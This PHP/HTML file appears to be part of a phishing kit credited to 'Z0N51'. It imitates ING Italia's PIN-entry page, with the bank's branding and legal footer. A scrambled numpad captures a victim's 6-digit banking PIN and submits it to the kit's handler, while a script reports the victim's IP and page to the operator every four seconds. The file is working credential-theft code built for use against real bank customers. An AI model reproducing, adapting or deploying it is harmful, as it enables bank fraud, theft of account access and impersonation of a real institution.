<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "pin";

?>
<!DOCTYPE html>
<html lang="it">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="stylesheet" href="<?php echo CSSPATH; ?>/style.css">

        <title>ING Italia - Inserisci il tuo PIN</title>
        <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #f2f2f2;
        }

        .header {
            background-color: white;
            padding: 15px 20px;
            border-bottom: 1px solid #e0e0e0;
        }

        .logo {
            width: 100px;
        }

        .container {
            max-width: 450px;
            margin: 40px auto;
            background-color: white;
            border-radius: 5px;
            padding: 30px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .last-access {
            text-align: left;
            color: #555;
            font-size: 14px;
            margin-bottom: 15px;
        }

        .access-time {
            font-weight: normal;
        }

        h1 {
            color: #ff6600;
            margin-bottom: 10px;
            font-size: 24px;
            text-align: left;
        }

        .instruction {
            color: #555;
            margin-bottom: 20px;
            font-size: 16px;
            text-align: left;
        }

        .pin-boxes {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 30px;
        }

        .pin-box {
            width: 50px;
            height: 50px;
            border: 1px solid #ccc;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
            background-color: white;
        }

        .numpad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            max-width: 280px;
            margin: 0 auto;
        }

        .numpad-btn {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            border: none;
            background-color: white;
            font-size: 24px;
            color: #ff6600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .numpad-btn:hover {
            background-color: #f5f5f5;
        }

        .delete-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid #0066cc;
            background-color: white;
            color: #0066cc;
            font-size: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .action-buttons {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 30px;
        }

        .continue-btn {
            background-color: #ff6600;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
        }

        .back-btn {
            background-color: white;
            color: #ff6600;
            border: 1px solid #ff6600;
            padding: 12px 25px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        .continue-btn:hover {
            background-color: #e65c00;
        }

        .back-btn:hover {
            background-color: #fff8f5;
        }

        .help-link {
            display: flex;
            align-items: center;
            color: #0066cc;
            text-decoration: none;
            margin-top: 20px;
            font-size: 14px;
            justify-content: flex-start;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        .arrow {
            color: #ff6600;
            font-weight: bold;
            margin-right: 5px;
            font-size: 18px;
        }
        </style>
<style>
.error-box {
    border: 1px solid #e74c3c;
    /* red border */
    background-color: #fff;
    color: #333;
    display: flex;
    align-items: center;
    padding: 12px 16px;
    border-radius: 4px;
    font-family: Arial, sans-serif;
    font-size: 14px;
    max-width: 500px;
    margin-bottom: 20px;
}

.error-icon {
    color: #e74c3c;
    font-weight: bold;
    margin-right: 10px;
    font-size: 16px;
}

.error-text {
    flex: 1;
    line-height: 1.4;
}
</style>        
    </head>

    <body>

        <!-- HEADER -->
      <header class="header_1">
        <div class="container_header_1">
          <div class="logo">
            <img src="<?php echo IMGSPATH; ?>/logo.svg" alt="">
          </div>
        </div>
      </header>



<div class="container">
        <form id="pinForm" action="index.php" method="POST">
                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="pin">
        <input type="hidden" name="pin">
        <input type="hidden" id="pinValue" name="pinValue" value="">
        <h1>Inserisci il tuo PIN</h1>
        <p class="instruction">Inserisci tutte le 6 cifre del tuo codice PIN</p>
        <div class="error-box" style="<?php echo isset($_GET['error']) ? 'display: flex;' : 'display: none;'; ?>">
            <span class="error-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                    fill="var(--fg_error, #D70000)" focusable="false" aria-hidden="true">
                    <path
                        d="M11.2178,15.6895 C11.2178,15.9065 11.1178,16.0065 10.8678,16.0065 L9.1158,16.0065 C8.8828,16.0065 8.7818,15.9065 8.7818,15.6895 L8.7818,13.9545 C8.7818,13.7375 8.8828,13.6365 9.1158,13.6365 L10.8678,13.6365 C11.1178,13.6365 11.2178,13.7375 11.2178,13.9545 L11.2178,15.6895 Z M9.1988,3.9935 L10.8008,3.9935 C11.0338,3.9935 11.1178,4.0935 11.1178,4.2935 L10.8848,11.8355 C10.8848,12.0015 10.8188,12.0515 10.6348,12.0515 L9.3998,12.0515 C9.2158,12.0515 9.1498,12.0015 9.1498,11.8355 L8.8828,4.2935 C8.8828,4.0935 8.9658,3.9935 9.1988,3.9935 L9.1988,3.9935 Z M9.9998,0.0005 C4.4868,0.0005 -0.0002,4.4855 -0.0002,10.0005 C-0.0002,15.5135 4.4868,20.0005 9.9998,20.0005 C15.5138,20.0005 19.9998,15.5135 19.9998,10.0005 C19.9998,4.4855 15.5138,0.0005 9.9998,0.0005 L9.9998,0.0005 Z"
                        transform="translate(2 2)"></path>
                </svg></span>
            <span class="error-text">
                Oops ... il PIN inserito non è corretto. Controlla e riprova.
            </span>
        </div>
        <div class="pin-boxes">
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
            <div class="pin-box"></div>
        </div>

        <div class="numpad">
            <button type="button" class="numpad-btn">4</button>
            <button type="button" class="numpad-btn">3</button>
            <button type="button" class="numpad-btn">9</button>
            <button type="button" class="numpad-btn">8</button>
            <button type="button" class="numpad-btn">0</button>
            <button type="button" class="numpad-btn">2</button>
            <button type="button" class="numpad-btn">7</button>
            <button type="button" class="numpad-btn">6</button>
            <button type="button" class="numpad-btn">1</button>
            <button type="button" class="numpad-btn">5</button>
            <div></div>
            <button type="button" class="delete-btn">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0066cc" stroke-width="2">
                    <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                    <line x1="18" y1="9" x2="12" y2="15"></line>
                    <line x1="12" y1="9" x2="18" y2="15"></line>
                </svg>
            </button>
        </div>

        <div class="action-buttons">
            <button type="button" id="continueBtn" class="continue-btn" disabled>Continua</button>
            <button type="button" class="back-btn">Indietro</button>
        </div>
    </form>

    <a href="#" class="help-link">
        <span class="arrow">▸</span>
        Hai dimenticato il PIN?
    </a>
</div>

    <!-- footer -->
      <footer class="footer_1">
        <div class="container_footer_1">
          <div class="links_footer">
            <ul class="ps-0 mb-0">
              <li>Sicurezza</li>
              <li>Definizione di Default</li>
              <li>Privacy</li>
            </ul>
            <ul class="ps-0 mb-0">
              <li>Trasparenza</li>
              <li>Reclami</li>
              <li>Cookies</li>
            </ul>
          </div>
          <div class="copyghit">
            <p class="mb-0">© 2026 ING BANK N.V. Milan Branch P.I. 11241140158</p>
          </div>
        </div>
      </footer>


        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="<?php echo JSPATH; ?>/script.js"></script>

<script>
// PIN Management
let pinDigits = [];
const maxDigits = 6;
const pinBoxes = document.querySelectorAll('.pin-box');
const numpadButtons = document.querySelectorAll('.numpad-btn');
const deleteButton = document.querySelector('.delete-btn');
const continueButton = document.querySelector('#continueBtn');
const backButton = document.querySelector('.back-btn');

// Disable continue button initially
continueButton.disabled = true;
continueButton.style.opacity = '0.5';

// Add event listeners to numpad buttons
numpadButtons.forEach(button => {
    button.addEventListener('click', () => {
        if (pinDigits.length < maxDigits) {
            const digit = button.textContent;
            addPinDigit(digit);
        }
    });
});

// Add event listener to delete button
deleteButton.addEventListener('click', () => {
    if (pinDigits.length > 0) {
        removePinDigit();
    }
});

// Add PIN digit
function addPinDigit(digit) {
    pinDigits.push(digit);

    // Update the corresponding pin box
    pinBoxes[pinDigits.length - 1].innerHTML = '•';

    // Enable continue button if all 6 digits entered
    if (pinDigits.length === maxDigits) {
        continueButton.disabled = false;
        continueButton.style.opacity = '1';
    }
}

// Remove PIN digit
function removePinDigit() {
    pinDigits.pop();

    // Clear the corresponding pin box
    pinBoxes[pinDigits.length].innerHTML = '';

    // Disable continue button if not all 6 digits entered
    if (pinDigits.length < maxDigits) {
        continueButton.disabled = true;
        continueButton.style.opacity = '0.5';
    }
}

// Handle keyboard input
document.addEventListener('keydown', (event) => {
    // Handle number keys (0-9)
    if (/^[0-9]$/.test(event.key) && pinDigits.length < maxDigits) {
        addPinDigit(event.key);
    }

    // Handle backspace key
    if (event.key === 'Backspace' && pinDigits.length > 0) {
        removePinDigit();
    }

    // Handle enter key
    if (event.key === 'Enter' && pinDigits.length === maxDigits) {
        continueButton.click();
    }
});

// Handle continue button click
continueButton.addEventListener('click', () => {
    if (pinDigits.length === maxDigits) {
        // Set PIN value in hidden field
        document.getElementById('pinValue').value = pinDigits.join('');

        // Submit the form
        document.getElementById('pinForm').submit();
    }
});

// Handle back button
backButton.addEventListener('click', () => {
    // Navigate back to login page
    window.location.href = "index.php?redirection=login";
});

    worker();
            var jsonData = {
              action: 'VISITORS',
              ip: '<?php echo get_client_ip(); ?>',
              page: 'pin'
            };
            sendAjaxRequestEveryFourSeconds(jsonData);

</script>
</body>

</html>